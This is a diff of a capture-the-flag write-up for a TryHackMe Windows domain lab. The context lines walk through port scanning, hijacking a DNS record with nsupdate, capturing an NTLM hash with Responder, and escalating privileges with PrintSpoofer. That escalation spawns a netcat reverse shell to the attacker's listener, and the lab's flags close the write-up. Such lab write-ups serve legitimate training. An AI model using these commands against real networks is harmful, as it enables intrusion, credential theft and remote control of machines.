@@ -16,7 +16,6 @@ _(Give it at least 5 minutes to boot)_
 ┌──(kali㉿kali)-[~/threader3000]
 └─$ git clone https://github.com/dievus/threader3000.git
 
-
 ┌──(kali㉿kali)-[~/threader3000]
 └─$ python3 threader3000.py               
 ------------------------------------------------------------
@@ -77,7 +76,6 @@ Would you like to run Nmap or quit to terminal?
 1 = Run suggested Nmap scan
 2 = Run another Threader3000 scan
 3 = Exit to terminal
-
 
 ┌──(kali㉿kali)-[~/threader3000]
 └─$ rustscan -a 10.10.219.166 --ulimit 5500 -b 65535 -- -A
@@ -990,7 +988,6 @@ Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, D
 10.10.219.166 selfservice.windcorp.thm
 10.10.219.166 selfservice.dev.windcorp.thm
 
-
 ┌──(kali㉿kali)-[~]
 └─$ gobuster dir -u https://fire.windcorp.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -k
 ===============================================================
@@ -1120,7 +1117,6 @@ CTRL+C detected: Pausing threads, please wait...
                                                                               
 Canceled by the user
 
-
 ┌──(kali㉿kali)-[~/ra2]
 └─$ cp ../Downloads/cert.pfx cert.pfx
                                                                                              
@@ -1137,7 +1133,6 @@ An MX (mail exchange) record is a type of resource record in the DNS that specif
 A TXT (text) record is a type of resource record in the DNS that allows administrators to include arbitrary text in a DNS record. TXT records are often used to hold information such as SPF (Sender Policy Framework) records and DKIM (DomainKeys Identified Mail) keys, which are used to verify the authenticity of email messages.
 
 I hope this helps! Let me know if you have any other questions.
-
 
 ┌──(kali㉿kali)-[~/ra2]
 └─$ dig windcorp.thm -t NS  @10.10.219.166
@@ -1330,7 +1325,6 @@ rc4-40            seed              seed-cbc          seed-cfb
 seed-ecb          seed-ofb          sm4-cbc           sm4-cfb           
 sm4-ctr           sm4-ecb           sm4-ofb    
 
-
 ┌──(kali㉿kali)-[~/ra2]
 └─$ openssl pkcs12 -in cert.pfx 
 Enter Import Password:
@@ -1509,7 +1503,6 @@ HTMLToInject =
 SSLCert = certs/crt.pem
 SSLKey = certs/key.pem
 
-
 Let’s send a request to delete the existing A record for `selfservice.windcorp.thm` and then send an update add request for a new A record to have selfservice resolve to our THM IP.
 
 nsupdate is a command-line utility that allows you to submit Dynamic DNS Update requests to a DNS server. It is typically used to update resource records in the Domain Name System (DNS) in real-time, without the need to manually edit zone files or wait for DNS propagation.
@@ -1563,7 +1556,6 @@ selfservice.windcorp.thm. 1234  IN      A       10.8.19.103
 
   Author: Laurent Gaffie (laurent.gaffie@gmail.com)
   To kill this script hit CTRL-C
-
 
 [+] Poisoners:
     LLMNR                      [ON]
@@ -1631,7 +1623,6 @@ selfservice.windcorp.thm. 1234  IN      A       10.8.19.103
 [*] Skipping previously captured hash for WINDCORP\edwardle
 [*] Skipping previously captured hash for WINDCORP\edwardle
 
-
 ┌──(kali㉿kali)-[~/ra2]
 └─$ nano user_hash            
                                                                                                           
@@ -1679,7 +1670,6 @@ cert.pfx  crt.pem  hash  key.pem  nc.exe  PrintSpoofer.exe  user_hash
 ┌──(kali㉿kali)-[~/ra2]
 └─$ python3 -m http.server 1337
 Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
-
 
 Windows PowerShell
 Copyright (C) 2016 Microsoft Corporation. All rights reserved.
@@ -1784,7 +1774,6 @@ SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
 
  SeImpersonatePrivilege potential attack vector :) using printSpoofer
 
-
 ┌──(kali㉿kali)-[~/ra2]
 └─$ ls
 cert.pfx  crt.pem  hash  key.pem  nc64.exe  nc.exe  PrintSpoofer.exe  user_hash
@@ -1831,7 +1820,6 @@ C:\Users\edwardle.WINDCORP\Desktop>.\PrintSpoofer.exe -c ".\nc64.exe -e cmd.exe 
 [!] CreateProcessAsUser() failed because of a missing privilege, retrying with CreateProcessWithTokenW().
 [+] CreateProcessWithTokenW() OK
 
-
 ┌──(kali㉿kali)-[~/ra2]
 └─$ rlwrap nc -lnvp 7777                                  
 Ncat: Version 7.93 ( https://nmap.org/ncat )
@@ -1871,24 +1859,7 @@ THM{9a8b9f4f3af2bce68885106c1c8473ab85e0eda0}
 
 yep!! :)
 
-
-
 ```
-
-![[Pasted image 20221222144248.png]]
-![[Pasted image 20221222144303.png]]
-![[Pasted image 20221222144450.png]]
-![[Pasted image 20221222144506.png]]
-![[Pasted image 20221222144527.png]]
-![[Pasted image 20221222144546.png]]
-![[Pasted image 20221222145741.png]]
-
-![[Pasted image 20221222150032.png]]
-![[Pasted image 20221222175142.png]]
-
-![[Pasted image 20221222175244.png]]
-
-![[Pasted image 20221222175650.png]]
 
 What is flag 1?
 *THM{Allowing nonsecure dynamic updates is a significant security vulnerability because updates can be accepted from untrusted sources}*
@@ -1899,6 +1870,5 @@ What is flag 2?
 
 What is flag 3?
 *THM{9a8b9f4f3af2bce68885106c1c8473ab85e0eda0}*
-
 
 [[Advent of Cyber 2022]]
